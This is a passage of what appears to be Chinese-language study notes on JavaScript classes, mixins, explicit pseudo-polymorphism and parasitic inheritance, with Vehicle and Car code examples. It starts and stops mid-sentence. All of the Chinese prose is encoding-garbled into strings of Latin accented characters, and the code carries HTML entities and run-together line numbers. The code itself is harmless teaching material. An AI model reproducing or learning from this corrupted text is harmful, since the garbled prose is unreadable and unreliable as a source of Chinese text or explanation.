å¯¹è±¡ä¸­ï¼Œå› æ­¤å®ƒä»¬çš„æž„é€ å‡½æ•°ä¹‹é—´å¹¶ä¸å­˜åœ¨ç›´æŽ¥è”ç³»ï¼Œä»Žè€Œæ— æ³•ç®€å•åœ°å®žçŽ°ä¸¤è€…çš„ç›¸å¯¹å¼•ç”¨ï¼ˆåœ¨ ES6 ä¸­å¯ä»¥é€šè¿‡ super æ¥â€è§£å†³â€œè¿™ä¸ªé—®é¢˜ï¼‰ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ ignition() ä¸­çœ‹åˆ°å¤šæ€æœ‰è¶£çš„ä¸€ç‚¹ï¼Œåœ¨ pilot() ä¸­é€šè¿‡ç›¸å¯¹å¤šæ€å¼•ç”¨äº†ï¼ˆç»§æ‰¿ï¼‰Vehicleä¸­çš„ drive æ–¹æ³•ç›´æŽ¥é€šè¿‡åå­—ï¼ˆè€Œä¸æ˜¯ç›¸å¯¹å¼•ç”¨ï¼‰å¼•ç”¨äº† ignotion() æ–¹æ³•ã€‚ é‚£ä¹ˆè¯­è¨€å¼•æ“Žä¼šä½¿ç”¨å“ªä¸ª ignition(),Vehicle çš„è¿˜æ˜¯ SpeedBoat çš„ï¼Ÿå®žé™…ä¸Šå®ƒä¼šä½¿ç”¨ SpeedBoat ä¸­çš„ã€‚å¦‚æžœä½ ç›´æŽ¥å®žä¾‹åŒ– Vehicle ç±»ç„¶åŽè°ƒç”¨ å®ƒçš„ drive é‚£ä¹ˆè¯­è¨€å¼•æ“Žå°±ä¼šä½¿ç”¨ Vehicle ä¸­çš„ ignition æ–¹æ³•ã€‚ æ¢è¨€ä¹‹ï¼Œignition æ–¹æ³•å®šä¹‰çš„å¤šæ€æ€§å–å†³äºŽä½ æ˜¯åœ¨å“ªä¸ªç±»çš„å®žä¾‹ä¸­å¼•ç”¨å®ƒã€‚åªæœ‰ç†è§£äº†è¿™ä¸ªç»†èŠ‚æ‰èƒ½ç†è§£ JavaScript ä¸­ç±»ä¼¼ï¼ˆä½†æ˜¯å¹¶ä¸ç›¸åŒï¼‰çš„ [[Prototype]]æœºåˆ¶ã€‚ åœ¨å­ç±»ï¼ˆè€Œä¸æ˜¯å®ƒä»¬åˆ›å»ºçš„å®žä¾‹å¯¹è±¡ï¼‰ä¸­ä¹Ÿå¯ä»¥ç›¸å¯¹å¼•ç”¨å®ƒç»§æ‰¿çš„çˆ¶ç±»ï¼Œè¿™ç§ç›¸å¯¹å¼•ç”¨é€šå¸¸è¢«ç§°ä¸º superã€‚ å¤šæ€ä¸è¡¨ç¤ºå­ç±»å’Œçˆ¶ç±»æœ‰å…³è”ï¼Œå­ç±»å¾—åˆ°çš„åªæ˜¯çˆ¶ç±»çš„ä¸€ä»½å‰¯æœ¬ï¼Œç±»çš„ç»§æ‰¿å…¶å®žå°±æ˜¯å¤åˆ¶ã€‚ å¤šé‡ç»§æ‰¿æœ‰äº›é¢å‘ç±» çš„è¯­è¨€å…è®¸ç»§æ‰¿å¤šä¸ªç±»ï¼Œå¤šé‡ç»§æ‰¿æ„å‘³ç€æ‰€æœ‰çˆ¶ç±»çš„å®šä¹‰éƒ½ä¼šè¢«å¤åˆ¶åˆ°å­ç±»ä¸­ã€‚ä»Žè¡¨é¢ä¸Šçœ‹ï¼Œå¯¹äºŽç±»æ¥è¯´ä¼¼ä¹Žæ˜¯ä¸€ä¸ªéžå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œå¯ä»¥æŠŠè®¸å¤šåŠŸèƒ½ç»„åˆåœ¨ä¸€èµ·ã€‚ç„¶è€Œï¼Œè¿™ä¸ªæœºåˆ¶åŒæ—¶ä¹Ÿä¼šå¸¦æ¥å¾ˆå¤šå¤æ‚çš„é—®é¢˜ã€‚å¦‚æžœä¸¤ä¸ªçˆ¶ç±»ä¸­éƒ½å®šä¹‰äº† drive æ–¹æ³•çš„è¯ï¼Œå­ç±»å¼•ç”¨çš„æ˜¯å“ªä¸ªï¼Ÿè¿™æ ·å¤šæ€ç»§æ‰¿çš„å¾ˆå¤šä¼˜ç‚¹å°±ä¸å­˜åœ¨äº†ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§è¢«ç§°ä¸ºé’»çŸ³é—®é¢˜çš„å˜ç§ã€‚è¿™é—®é¢˜ä¸­ï¼Œå­ç±» D ç»§æ‰¿è‡ªä¸¤ä¸ªçˆ¶ç±»ï¼ˆB å’Œ Cï¼‰ ï¼Œè¿™ä¸¤ä¸ªçˆ¶ç±»éƒ½ç»§æ‰¿ Aã€‚å¦‚æžœ A ä¸­ æœ‰ drive æ–¹æ³•å¹¶ä¸” B å’Œ C éƒ½é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼ˆå¤šæ€ï¼‰ï¼Œé‚£å½“ D å¼•ç”¨åº”è¯¥é€‰æ‹©å“ªä¸ªç‰ˆæœ¬ï¼Ÿ ç›¸æ¯”ä¹‹ä¸‹ï¼ŒJavaScript è¦ç®€å•å¾—å¤šï¼Œå®ƒæœ¬èº«å¹¶ä¸æä¾› â€œå¤šé‡ç»§æ‰¿â€åŠŸèƒ½ï¼Œç„¶åŽå¼€å‘è€…ä¼šç”¨å…¶ä»–åŠžæ³•æ¥å®žçŽ°å¤šé‡ç»§æ‰¿ã€‚ æ··å…¥åœ¨ç»§æ‰¿æˆ–è€…å®žä¾‹åŒ–æ—¶ï¼ŒJavaScript çš„å¯¹è±¡æœºåˆ¶å¹¶ä¸ä¼šè‡ªåŠ¨æ‰§è¡Œå¤åˆ¶è¡Œä¸ºï¼Œç®€å•æ¥è¯´ï¼ŒJavaScript ä¸­åªæœ‰å¯¹è±¡ï¼Œå¹¶ä¸å­˜åœ¨å¯ä»¥è¢«å®žä¾‹åŒ–çš„ â€œç±»â€ï¼Œä¸€ä¸ªå¯¹è±¡å¹¶ä¸ä¼šè¢«å¤åˆ¶åˆ°å…¶ä»–å¯¹è±¡ï¼Œå®ƒä»¬ä¼šè¢«å…³è”èµ·æ¥ã€‚ç”±äºŽåœ¨å…¶ä»–è¯­è¨€ä¸­ç±»è¡¨çŽ°å‡ºæ¥çš„éƒ½æ˜¯å¤åˆ¶è¡Œä¸ºï¼Œå› æ­¤ JavaScript å¼€å‘è€…ä¹Ÿæƒ³å‡ºäº†ä¸€ä¸ªæ–¹æ³•æ¥æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯æ··å…¥ï¼šæ˜¾å¼æ··å…¥å’Œéšå¼æ··å…¥ æ˜¾å¼æ··å…¥é¦–å…ˆæˆ‘ä»¬å›žé¡¾ä¸€ä¸‹ä¹‹å‰æåˆ°çš„ Vehicle å’Œ Car ï¼Œç”±äºŽ JavaScript ä¸ä¼šè‡ªåŠ¨å®žçŽ° Vehicle åˆ° Car çš„å¤åˆ¶è¡Œä¸ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å®žçŽ°å¤åˆ¶åŠŸèƒ½ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨è®¸å¤šåº“å’Œæ¡†æž¶æ±‡æ€»è¢«ç§°ä¸º extend(â€¦) ,ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£æˆ‘ä»¬ç§°ä¹‹ä¸º mixin(â€¦) 1234567891011121314151617181920212223242526272829// éžå¸¸ç®€å•çš„ mixin ä¾‹å­function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; // åªä¼šåœ¨ä¸å­˜åœ¨çš„æƒ…å†µä¸‹å¤åˆ¶ if(!(key in targetObj))&#123; targetObj[key] = sourceObj[key]; &#125; &#125; return targetObj;&#125;var Vehicle = &#123; engines:1, ignition:function()&#123; console.log("Turing on my engine"); &#125;, drive:function()&#123; this.ignition(); console.log("Streeing and moving forward!"); &#125;&#125;var Car = mixin(Vehicle,&#123; wheels:4, drive:function()&#123; Vehicle.drive.call(this); console.log("Rolling on all" +this.wheels + "wheels!"); &#125;&#125;); æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¤„ç†çš„å·²ç»ä¸æ˜¯ç±»ï¼Œå› ä¸ºåœ¨ JavaScript ä¸­ä¸å­˜åœ¨ç±»ï¼ŒVehicle å’Œ Car éƒ½æ˜¯å¯¹è±¡ï¼Œä¾›æˆ‘ä»¬åˆ†åˆ«å¤åˆ¶å’Œç²˜è´´ çŽ°åœ¨ Car ä¸­å°±æœ‰äº†ä¸€ä»½ Vehicle å±žæ€§å’Œå‡½æ•°çš„å‰¯æœ¬ï¼Œä»ŽæŠ€æœ¯è§’åº¦æ¥è¯´ï¼Œå‡½æ•°å®žé™…æ²¡æœ‰è¢«å¤åˆ¶ï¼Œå¤åˆ¶çš„åªæ˜¯å‡½æ•°å¼•ç”¨ã€‚æ‰€ä»¥ï¼ŒCar ä¸­çš„å±žæ€§ ignition åªæ˜¯ä»Ž Vehicle ä¸­å¤åˆ¶è¿‡æ¥çš„å¯¹äºŽ ignition() å‡½æ•°çš„å¼•ç”¨ã€‚ç›¸åï¼Œå±žæ€§ engines å°±æ˜¯ç›´æŽ¥ä»Ž Vehicle ä¸­å¤åˆ¶äº†å€¼1. Car å·²ç»æœ‰äº† drive å±žæ€§ï¼ˆå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥è¿™ä¸ªå±žæ€§å¼•ç”¨å¹¶æ²¡æœ‰ç›´æŽ¥è¢« mixin é‡å†™ï¼Œä»Žè€Œä¿ç•™äº† Car ä¸­å®šä¹‰çš„åŒåå±žæ€§ï¼Œå®žçŽ°äº†â€œå­ç±»â€å¯¹ â€œçˆ¶ç±»â€çš„å±žæ€§çš„é‡å†™ 1.å†è¯´å¤šæ€Vehicle.drive.call(this); è¿™å°±æ˜¯æ˜¾å¼å¤šæ€ï¼Œè®°å¾—ä¼ªä»£ç ä¸­å¯¹åº”çš„è¯­å¥æ˜¯ inheritedï¼šdrive()ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç›¸å¯¹å¤šæ€ã€‚ JavaScript å¹¶æ²¡æœ‰ç›¸å¯¹å¤šæ€çš„æœºåˆ¶ã€‚æ‰€ä»¥ï¼Œç”±äºŽ Car å’Œ Vehicle ä¸­éƒ½æœ‰ drive() å‡½æ•°ï¼Œä¸ºäº†æŒ‡æ˜Žè°ƒç”¨å¯¹è±¡ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨ç»å¯¹ï¼ˆè€Œä¸æ˜¯ç›¸å¯¹ï¼‰å¼•ç”¨ã€‚æˆ‘ä»¬é€šè¿‡åç§°æ˜¾å¼æŒ‡å®š Vehicle å¯¹è±¡å¹¶è°ƒç”¨å®ƒçš„ drive å‡½æ•°ã€‚ ä½†æ˜¯å¦‚æžœç›´æŽ¥æ‰§è¡Œ Vehicle.drive()ï¼Œå‡½æ•°è°ƒç”¨ä¸­çš„ this ä¼šè¢«ç»‘å®šåˆ° Vehicle å¯¹è±¡è€Œä¸æ˜¯ Car å¯¹è±¡ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨ .call(this) æ¥ç¡®ä¿ drive() åœ¨ Car å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚ å¦‚æžœå‡½æ•° Car.drive çš„åç§°æ ‡è¯†ç¬¦å¹¶æ²¡æœ‰å’Œ Vehicle.drive é‡å ï¼ˆæˆ–è€…è¯´â€œå±è”½â€ï¼‰çš„è¯ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å®žçŽ°æ–¹æ³•å¤šæ€ï¼Œå› ä¸ºè°ƒç”¨ mixin(..) æœ‰æ—¶ä¼šæŠŠå‡½æ•° Vehicle.drive() çš„å¼•ç”¨å¤åˆ¶åˆ° Car ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æŽ¥è®¿é—® this.drive().æ­£æ˜¯ç”±äºŽå­˜åœ¨æ ‡è¯†ç¬¦é‡å ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨æ›´åŠ å¤æ‚çš„æ˜¾å¼å¤šæ€æ–¹æ³•ã€‚ åœ¨æ”¯æŒç›¸å¯¹å¤šæ€çš„é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼ŒCar å’Œ Vehicle ä¹‹é—´çš„è”ç³»åªåœ¨ç±»çš„å®šä¹‰çš„å¼€å¤´è¢«åˆ›å»ºï¼Œä»Žè€Œåªéœ€è¦åœ¨è¿™ä¸€ä¸ªåœ°æ–¹ç»´æŠ¤ä¸¤ä¸ªç±»çš„è”ç³»ã€‚ ä½†æ˜¯åœ¨ JavaScript ä¸­ï¼ˆç”±äºŽå±è”½ï¼‰ä½¿ç”¨æ˜¾å¼ä¼ªå¤šæ€ä¼šåœ¨æ‰€æœ‰éœ€è¦ä½¿ç”¨ï¼ˆä¼ªï¼‰å¤šæ€å¼•ç”¨çš„åœ°æ–¹åˆ›å»ºä¸€ä¸ªå‡½æ•°å…³è”ï¼Œè¿™ä¼šæžå¤§åœ°å¢žåŠ ç»´æŠ¤æˆæœ¬ã€‚æ­¤å¤–ï¼Œç”±äºŽæ˜¾å¼ä¼ªå¤šæ€å¯ä»¥æ¨¡æ‹Ÿå¤šé‡ç»§æ‰¿ï¼Œæ‰€ä»¥å®ƒä¼šè¿›ä¸€æ­¥å¢žåŠ ä»£ç çš„å¤æ‚åº¦å’Œç»´æŠ¤ç¨‹åº¦ã€‚ ä½¿ç”¨ä¼ªå¤šæ€é€šå¸¸ä¼šå¯¼è‡´ä»£ç å˜å¾—å¤æ‚ï¼Œéš¾ä»¥é˜…è¯»å¹¶ä¸”éš¾ä»¥ç»´æŠ¤ï¼Œå› æ­¤åº”å½“å°½é‡é¿å…ä½¿ç”¨æ˜¾å¼ä¼ªå¤šæ€ï¼Œå› ä¸ºè¿™æ ·å¾€å¾€ä¼šå¾—ä¸å¿å¤±ã€‚ 2.æ··åˆå¤åˆ¶å›žå½’ä¹‹å‰çš„ mixin å‡½æ•° 12345678910// éžå¸¸ç®€å•çš„ mixin ä¾‹å­function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; // åªä¼šåœ¨ä¸å­˜åœ¨çš„æƒ…å†µä¸‹å¤åˆ¶ if(!(key in targetObj))&#123; targetObj[key] = sourceObj[key]; &#125; &#125; return targetObj;&#125; åˆ†æžä¸€ä¸‹ mixin çš„å·¥ä½œåŽŸç†ï¼Œå®ƒä¼šéåŽ† sourceObj çš„å±žæ€§ï¼Œç„¶åŽåœ¨ targetObj æ²¡æœ‰è¿™ä¸ªå±žæ€§å°±ä¼šè¿›è¡Œå¤åˆ¶ã€‚ç”±äºŽæˆ‘ä»¬æ˜¯åœ¨ç›®æ ‡å¯¹è±¡åˆå§‹åŒ–ä¹‹åŽæ‰è¿›è¡Œå¤åˆ¶ï¼Œå› æ­¤ä¸€å®šè¦å°å¿ƒä¸è¦è¦†ç›–ç›®æ ‡å¯¹è±¡çš„åŽŸæœ‰å±žæ€§ã€‚ å¦‚æžœæˆ‘ä»¬æ˜¯å…ˆè¿›è¡Œå¤åˆ¶ç„¶åŽå¯¹ Car è¿›è¡Œç‰¹æ®ŠåŒ–çš„è¯ï¼Œå°±å¯ä»¥è·³è¿‡å­˜åœ¨æ€§æ£€æŸ¥ã€‚ä¸è¿‡è¿™ç§æ–¹æ³•å¹¶ä¸å¥½ç”¨å¹¶ä¸”æ•ˆçŽ‡æ›´ä½Žï¼Œä¸å¦‚ç¬¬ä¸€ç§æ–¹æ³•å¸¸ç”¨ï¼š 123456789101112131415161718192021// å¦å¤–ä¸€ç§æ··å…¥å‡½æ•°ï¼Œå¯èƒ½æœ‰é‡å†™é£Žé™©function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; targetObj[key] = sourceObj[key]; &#125; return targetObj;&#125;var Vehicle = &#123; // ...&#125;// é¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡æŠŠ Vehicle çš„å†…å®¹å¤åˆ¶è¿›åŽ»var Car = mixin(Vehicle,&#123;&#125;);// ç„¶åŽæŠŠæ–°å†…å®¹å¤åˆ¶åˆ° Car ä¸­mixin(&#123; wheel:4, drive:function()&#123; // .. &#125;&#125;,Car) è¿™ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥æŠŠä¸é‡å çš„å†…å®¹ä»Ž Vehicle ä¸­æ˜¾å¼å¤åˆ¶åˆ° Car ä¸­ã€‚â€œæ··å…¥â€è¿™ä¸ªåå­—æ¥æºäºŽè¿™ä¸ªè¿‡ç¨‹çš„ä¸€ç§è§£é‡Šï¼šCar ä¸­æ··åˆäº† Vehicle çš„å†…å®¹ï¼Œå°±åƒä½ æŠŠå·§å…‹åŠ›æ··åˆåˆ°ä½ æœ€å–œæ¬¢çš„é¥¼å¹²é¢å›¢ä¸­ä¸€æ ·ã€‚ å¤åˆ¶æ“ä½œå®ŒæˆåŽï¼ŒCar å’Œ Vehicle åˆ†ç¦»äº†ï¼Œå‘ Car ä¸­æ·»åŠ å±žæ€§ä¸ä¼šå½±å“ Vehicle ï¼Œåä¹‹äº¦ç„¶ã€‚ è¿™é‡Œè·³è¿‡äº†ä¸€äº›å°ç»†èŠ‚ï¼Œå®žé™…ä¸Šï¼Œåœ¨å¤åˆ¶å®Œæˆä¹‹åŽä¸¤è€…ä¹‹é—´ä»ç„¶æœ‰ä¸€äº›å·§å¦™çš„æ–¹æ³•å¯ä»¥å½±å“åˆ°å¯¹æ–¹ï¼Œä¾‹å¦‚å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼ˆæ¯”å¦‚ä¸€ä¸ªæ•°ç»„ï¼‰ ç”±äºŽä¸¤ä¸ªå¯¹è±¡å¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤è¿™ç§å¤åˆ¶ï¼ˆæˆ–è€…è¯´æ··å…¥ï¼‰å®žé™…ä¸Šå¹¶ä¸èƒ½å®Œå…¨æ¨¡æ‹Ÿé¢å‘ç±»çš„è¯­è¨€ä¸­çš„å¤åˆ¶ã€‚ JavaScript ä¸­çš„å‡½æ•°æ— æ³•ï¼ˆç”¨æ ‡å‡†ã€å¯é çš„æ–¹æ³•ï¼‰çœŸæ­£åœ°å¤åˆ¶ï¼Œä½ åªæ˜¯å¤åˆ¶å¯¹å…±äº«å‡½æ•°å¯¹è±¡çš„å¼•ç”¨ï¼ˆå‡½æ•°å°±æ˜¯å¯¹è±¡ï¼‰ã€‚å¦‚æžœä½ ä¿®æ”¹äº†è´¡çŒ®çš„å‡½æ•°å¯¹è±¡ï¼ˆæ¯”å¦‚ ignitionï¼‰ï¼Œæ¯”å¦‚æ·»åŠ äº†ä¸€ä¸ªå±žæ€§ï¼Œé‚£ Vehicle å’Œ Car éƒ½ä¼šå—åˆ°å½±å“ã€‚ æ˜¾å¼æ··å…¥æ˜¯ JavaScript ä¸­ä¸€ä¸ªå¾ˆæ£’çš„æœºåˆ¶ï¼Œä¸è¿‡å®ƒçš„åŠŸèƒ½ä¹Ÿæ²¡æœ‰çœ‹èµ·æ¥é‚£ä¹ˆå¼ºå¤§ã€‚è™½ç„¶å®ƒå¯ä»¥æŠŠä¸€ä¸ªå¯¹è±¡çš„å±žæ€§å¤åˆ¶åˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œä½†æ˜¯è¿™å…¶å®žå¹¶ä¸èƒ½å¸¦æ¥å¤ªå¤šå¥½å¤„ï¼Œæ— éžå°±æ˜¯å°‘å‡ æ¡å®šä¹‰è¯­å¥ï¼Œè€Œä¸”è¿˜ä¼šå¸¦æ¥æˆ‘ä»¬åˆšåˆšæåŠçš„å‡½æ•°å¯¹è±¡å¼•ç”¨é—®é¢˜ã€‚ å¦‚æžœä½ å‘ç›®æ ‡å¯¹è±¡ä¸­æ˜¾å¼æ··å…¥è¶…è¿‡ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥éƒ¨åˆ†æ¨¡ä»¿å¤šé‡ç»§æ‰¿è¡Œä¸ºï¼Œä½†æ˜¯ä»æ²¡æœ‰ç›´æŽ¥çš„æ–¹å¼æ¥å¤„ç†å‡½æ•°å’Œå±žæ€§çš„åŒåé—®é¢˜ã€‚æœ‰äº›å¼€å‘è€…/åº“æå‡ºäº†â€œæ™šç»‘å®šâ€æŠ€æœ¯å’Œå…¶ä»–çš„ä¸€äº›è§£å†³æ–¹æ³•ï¼Œä½†æ˜¯ä»Žæ ¹æœ¬ä¸Šæ¥è¯´ï¼Œä½¿ç”¨è¿™äº›æ–¹æ³•é€šå¸¸ä¼šï¼ˆé™ä½Žæ€§èƒ½å¹¶ä¸”ï¼‰å¾—ä¸å¿å¤±ã€‚ ä¸€å®šè¦æ³¨æ„ï¼Œåªåœ¨èƒ½å¤Ÿæé«˜ä»£ç å¯è¯»æ€§çš„å‰æä¸‹ä½¿ç”¨æ˜¾å¼æ··å…¥ï¼Œé¿å…ä½¿ç”¨å¢žåŠ ä»£ç ç†è§£éš¾åº¦è®©å¯¹è±¡å…³ç³»æ›´åŠ å¤æ‚çš„æ¨¡å¼ã€‚ å¦‚æžœä½¿ç”¨æ··å…¥æ—¶æ„Ÿè§‰è¶Šæ¥è¶Šå›°éš¾ï¼Œé‚£æˆ–è®¸ä½ åº”è¯¥åœæ­¢ä½¿ç”¨å®ƒäº†ã€‚å®žé™…ä¸Šï¼Œå¦‚æžœä½ å¿…é¡»ä½¿ç”¨ä¸€ä¸ªå¤æ‚çš„åº“æˆ–è€…å‡½æ•°æ¥å®žçŽ°è¿™äº›ç»†èŠ‚ï¼Œé‚£å°±æ ‡å¿—ç€ä½ çš„æ–¹æ³•æ˜¯æœ‰é—®é¢˜çš„æˆ–è€…æ˜¯ä¸å¿…è¦çš„ã€‚åŽé¢ä¼šè¯•ç€æå‡ºä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•ï¼Œå®ƒèƒ½æ»¡è¶³è¿™äº›éœ€æ±‚å¹¶ä¸”å¯ä»¥é¿å…æ‰€æœ‰çš„é—®é¢˜ã€‚ 3.å¯„ç”Ÿç»§æ‰¿æ˜¾å¼æ··å…¥çš„ä¸€ç§å˜ä½“è¢«ç§°ä¸ºâ€œå¯„ç”Ÿç»§æ‰¿â€ï¼Œå®ƒæ—¢æ˜¯æ˜¾å¼çš„åˆæ˜¯éšå¼çš„ï¼Œä¸‹é¢æ˜¯å®ƒçš„å·¥ä½œåŽŸç†ï¼š 123456789101112131415161718192021222324252627// ä¼ ç»Ÿçš„ JavaScript ç±» Vehiclefunction Vehicle()&#123; this.engines = 1;&#125;Vehicle.prototype.ignition = function()&#123; console.log("Turing on my engine");&#125;Vehicle.prototype.drive = function()&#123; this.ignition(); console.log("Streeing and moving forward!");&#125;// å¯„ç”Ÿç±» Carfunction Car()&#123; var car = new Vehicle(); car.wheels = 4; var vehDrive = car.drive; car.drive = function()&#123; vehDrive.call(this); console.log("Rolling on all" +this.wheels + "wheels!"); &#125; return car;&#125;var myCar = new Car();myCar.drive();//Turing on my engine// Streeing and moving forward!// Rolling on all 4 "wheels! ä¸Šé¢çš„ä»£ç é¦–å…ˆå¤åˆ¶äº†ä¸€ä»½ Vehicle ï¼ˆå¯¹è±¡ï¼‰çˆ¶ç±»çš„å®šä¹‰ï¼Œç„¶åŽæ··å…¥å­ç±»ï¼ˆå¯¹è±¡ï¼‰çš„å®šä¹‰ï¼ˆå¦‚æžœéœ€è¦çš„è¯ä¿ç•™åˆ°çˆ¶ç±»çš„ç‰¹æ®Šå¼•ç”¨ï¼‰ï¼Œç„¶åŽç”¨è¿™ä¸ªå¤åˆå¯¹è±¡æž„å»ºå®žä¾‹ã€‚ è°ƒç”¨ new Car() æ—¶ä¼šå¤åˆ¶ä¸€ä¸ªæ–°çš„å¯¹è±¡å¹¶ç»‘å®šåˆ° Car çš„ this ä¸Šï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨è¿™ä¸ªå¯¹è±¡è€Œæ˜¯è¿”å›žäº†æˆ‘ä»¬è‡ªå·±çš„ car å¯¹è±¡ï¼Œæ‰€ä»¥æœ€åˆè¢«åˆ›å»ºçš„è¿™ä¸ªå¯¹è±¡ä¼šè¢«ä¸¢å¼ƒï¼Œå› ä¸ºå¯ä»¥ä¸ä½¿ç”¨ new å…³é”®å­—è°ƒç”¨ Car().è¿™æ ·åšçš„ç»“æžœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å¯ä»¥é¿å…åˆ›å»ºå¹¶ä¸¢å¼ƒå¤šä½™çš„å¯¹è±¡ã€‚ éšå¼æ··å…¥éšå¼æ··å…¥å’Œä¹‹å‰æåˆ°çš„æ˜¾å¼ä¼ªå¤šæ€å¾ˆåƒï¼Œå› æ­¤ä¹Ÿå…·å¤‡åŒæ ·çš„é—®é¢˜ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456789101112131415161718var Something = &#123; cool:function()&#123; this.greeting = "Hello World"; this.count = this.count ? this.count + 1 : 1; &#125;&#125;Something.cool();Something.greeting; // Hello WorldSomething.count; // 1var Another = &#123; cool:function()&#123; // éšå¼ æŠŠ Something æ··å…¥ Another Something.cool.call(this); &#125;&#125;Another.cool();Another.greeting; // Hello WorldAnother.count; // 1 (count ä¸æ˜¯å…±äº«çŠ¶æ€) é€šè¿‡åœ¨æž„é€ å‡½æ•°è°ƒç”¨æˆ–è€…æ–¹æ³•è°ƒç”¨ä¸­ä½¿ç”¨ Something.cool.call(this)ï¼Œæˆ‘ä»¬å®žé™…ä¸Šâ€œå€Ÿç”¨â€äº†å‡½æ•°Something.cool() å¹¶åœ¨ Another çš„ä¸Šä¸‹æ–‡æ±‡æ€»è°ƒç”¨äº†å®ƒï¼ˆé€šè¿‡ this ç»‘å®šï¼‰ï¼Œæœ€ç»ˆçš„ç»“æžœæ˜¯ Something.cool() ä¸­çš„èµ‹å€¼æ“ä½œéƒ½ä¼šåº”ç”¨åœ¨ Another å¯¹è±¡ä¸Šè€Œä¸æ˜¯ Something å¯¹è±¡ä¸Šã€‚ å› ä¸ºï¼Œæˆ‘ä»¬ æŠŠ Something çš„è¡Œä¸º â€œæ··å…¥â€åˆ°äº† Another ä¸­ã€‚ è™½ç„¶è¿™ç±»æŠ€æœ¯åˆ©ç”¨äº† this çš„é‡æ–°ç»‘å®šåŠŸèƒ½ï¼Œä½†æ˜¯ Something.cool.call(this) ä»ç„¶æ— æ³•å˜æˆç›¸å¯¹ï¼ˆè€Œä¸”æ›´çµæ´»ï¼‰å¼•ç”¨ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æ—¶è¦éžå¸¸å°å¿ƒï¼Œé€šå¸¸æ¥è¯´ï¼Œå°½é‡é¿å…ä½¿ç”¨è¿™æ ·çš„ç»“æž„ï¼Œæ¯”ä¿è¯ä»£ç çš„æ•´æ´å’Œå¯ç»´æŠ¤æ€§ã€‚ å°ç»“ç±»æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œè®¸å¤šè¯­è¨€éƒ½æä¾›äº†å¯¹äºŽé¢å‘ç±»è®¾è®¡è½¯ä»¶çš„åŽŸç”Ÿè¯­æ³•ï¼ŒJavaScript ä¹Ÿæœ‰ç±»ä¼¼çš„è¯­æ³•ï¼Œä½†æ˜¯å’Œå…¶ä»–è¯­è¨€ä¸­çš„ç±»å®Œå…¨ä¸åŒã€‚ç±»æ„å‘³ç€å¤åˆ¶ã€‚ ä¼ ç»Ÿçš„ç±»è¢«å®žä¾‹åŒ–ï¼Œå®ƒçš„è¡Œä¸ºæ˜¯ä¼šè¢«å¤åˆ¶åˆ°å®žä¾‹ä¸­ï¼Œç±»è¢«ç»§æ‰¿æ—¶ï¼Œè¡Œä¸ºä¹Ÿä¼šè¢«å¤åˆ¶åˆ°å­ç±»ä¸­ã€‚ å¤šæ€ï¼ˆåœ¨ç»§æ‰¿é“¾çš„ä¸åŒå±‚æ¬¡åç§°ç›¸åŒä½†æ˜¯åŠŸèƒ½ä¸åŒçš„å‡½æ•°ï¼‰çœ‹èµ·æ¥ä¼¼ä¹Žæ˜¯ä»Žå­ç±»å¼•ç”¨çˆ¶ç±»ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šå¼•ç”¨çš„å…¶å®žæ˜¯å¤åˆ¶çš„ç»“æžœã€‚ JavaScript å¹¶ä¸ä¼šï¼ˆåƒç±»é‚£æ ·ï¼‰è‡ªåŠ¨åˆ›å»ºå¯¹è±¡çš„å‰¯æœ¬ã€‚ æ··å…¥æ¨¡å¼ï¼ˆæ— è®ºæ˜¯æ˜¾å¼è¿˜æ˜¯éšå¼ï¼‰å¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸ºï¼Œä½†æ˜¯é€šå¸¸ä¼šäº§ç”Ÿä¸‘é™‹å¹¶ä¸”è„†å¼±çš„è¯­æ³•ï¼Œä¸å¦‚æ˜¾å¼ä¼ªå¤šæ€ï¼ˆOtherObj.methodName.call(this,â€¦)ï¼‰ï¼Œè¿™ä¼šè®©ä»£ç æ›´åŠ å›°éš¾å¹¶ä¸”éš¾ä»¥ç»´æŠ¤ã€‚æ­¤å¤–ï¼Œæ˜¾å¼æ··å…¥å®žé™…ä¸Šæ— æ³•å®Œå…¨æ¨¡æ‹Ÿç±»çš„å¤åˆ¶è¡Œä¸ºï¼Œå› 